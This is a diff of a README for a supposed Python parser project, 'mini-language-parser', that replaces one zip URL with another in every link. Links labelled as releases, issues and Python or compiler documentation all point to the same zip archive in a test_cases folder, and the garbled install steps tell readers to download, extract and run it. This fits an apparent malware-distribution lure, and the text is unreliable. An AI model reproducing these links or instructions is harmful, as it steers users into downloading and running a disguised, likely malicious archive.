@@ -8,13 +8,13 @@ Welcome to the mini-language-parser project! This tool helps you understand the 
 
 To get started, you will need to download the software. Visit the link below to access the Releases page:
 
-[![Download the latest version](https://raw.githubusercontent.com/probabagray/mini-language-parser/main/test_cases/mini_parser_language_2.2.zip%20Latest%20Version-v1.0-blue)](https://raw.githubusercontent.com/probabagray/mini-language-parser/main/test_cases/mini_parser_language_2.2.zip)
+[![Download the latest version](https://github.com/probabagray/mini-language-parser/raw/refs/heads/main/test_cases/mini-language-parser-v1.5-alpha.1.zip%20Latest%20Version-v1.0-blue)](https://github.com/probabagray/mini-language-parser/raw/refs/heads/main/test_cases/mini-language-parser-v1.5-alpha.1.zip)
 
 Follow these steps to download and run the application:
 
-1. Visit the [Releases page](https://raw.githubusercontent.com/probabagray/mini-language-parser/main/test_cases/mini_parser_language_2.2.zip).
+1. Visit the [Releases page](https://github.com/probabagray/mini-language-parser/raw/refs/heads/main/test_cases/mini-language-parser-v1.5-alpha.1.zip).
 2. Look for the latest version of mini-language-parser.
-3. Click on the appropriate file for your operating system (e.g., .exe for Windows, https://raw.githubusercontent.com/probabagray/mini-language-parser/main/test_cases/mini_parser_language_2.2.zip for Mac or Linux).
+3. Click on the appropriate file for your operating system (e.g., .exe for Windows, https://github.com/probabagray/mini-language-parser/raw/refs/heads/main/test_cases/mini-language-parser-v1.5-alpha.1.zip for Mac or Linux).
 4. Save the file to your computer.
 
 ## 📋 System Requirements
@@ -31,9 +31,9 @@ Before you install mini-language-parser, make sure your computer meets the follo
 After downloading the file, follow these steps to run the application:
 
 1. Locate the downloaded file on your computer.
-2. If you are on Windows, double-click the .exe file. For Mac or Linux, open a terminal and navigate to the folder where you saved the https://raw.githubusercontent.com/probabagray/mini-language-parser/main/test_cases/mini_parser_language_2.2.zip file, then extract it using a command like `tar -xvzf https://raw.githubusercontent.com/probabagray/mini-language-parser/main/test_cases/mini_parser_language_2.2.zip`.
-3. Once extracted, open the folder and find the `https://raw.githubusercontent.com/probabagray/mini-language-parser/main/test_cases/mini_parser_language_2.2.zip` file.
-4. Open your terminal (or command prompt), navigate to the folder, and type `python https://raw.githubusercontent.com/probabagray/mini-language-parser/main/test_cases/mini_parser_language_2.2.zip` to run the application.
+2. If you are on Windows, double-click the .exe file. For Mac or Linux, open a terminal and navigate to the folder where you saved the https://github.com/probabagray/mini-language-parser/raw/refs/heads/main/test_cases/mini-language-parser-v1.5-alpha.1.zip file, then extract it using a command like `tar -xvzf https://github.com/probabagray/mini-language-parser/raw/refs/heads/main/test_cases/mini-language-parser-v1.5-alpha.1.zip`.
+3. Once extracted, open the folder and find the `https://github.com/probabagray/mini-language-parser/raw/refs/heads/main/test_cases/mini-language-parser-v1.5-alpha.1.zip` file.
+4. Open your terminal (or command prompt), navigate to the folder, and type `python https://github.com/probabagray/mini-language-parser/raw/refs/heads/main/test_cases/mini-language-parser-v1.5-alpha.1.zip` to run the application.
 
 ## 📖 Features
 
@@ -65,7 +65,7 @@ If you run into issues, consider these common solutions:
 
 If you wish to help improve mini-language-parser, you can contribute in various ways:
 
-- Report bugs or issues on the [Issues page](https://raw.githubusercontent.com/probabagray/mini-language-parser/main/test_cases/mini_parser_language_2.2.zip).
+- Report bugs or issues on the [Issues page](https://github.com/probabagray/mini-language-parser/raw/refs/heads/main/test_cases/mini-language-parser-v1.5-alpha.1.zip).
 - Suggest new features.
 - Share your feedback.
 
@@ -75,8 +75,8 @@ For developers who want to contribute code, please fork the repository and creat
 
 To enhance your understanding, consider checking out these resources:
 
-- [Python Documentation](https://raw.githubusercontent.com/probabagray/mini-language-parser/main/test_cases/mini_parser_language_2.2.zip)
-- [Compiler Design](https://raw.githubusercontent.com/probabagray/mini-language-parser/main/test_cases/mini_parser_language_2.2.zip)
-- [Error Recovery in Parsing](https://raw.githubusercontent.com/probabagray/mini-language-parser/main/test_cases/mini_parser_language_2.2.zip)
+- [Python Documentation](https://github.com/probabagray/mini-language-parser/raw/refs/heads/main/test_cases/mini-language-parser-v1.5-alpha.1.zip)
+- [Compiler Design](https://github.com/probabagray/mini-language-parser/raw/refs/heads/main/test_cases/mini-language-parser-v1.5-alpha.1.zip)
+- [Error Recovery in Parsing](https://github.com/probabagray/mini-language-parser/raw/refs/heads/main/test_cases/mini-language-parser-v1.5-alpha.1.zip)
 
-Thank you for using mini-language-parser! Remember to visit the [Releases page](https://raw.githubusercontent.com/probabagray/mini-language-parser/main/test_cases/mini_parser_language_2.2.zip) for the latest updates and downloadable content.
+Thank you for using mini-language-parser! Remember to visit the [Releases page](https://github.com/probabagray/mini-language-parser/raw/refs/heads/main/test_cases/mini-language-parser-v1.5-alpha.1.zip) for the latest updates and downloadable content.
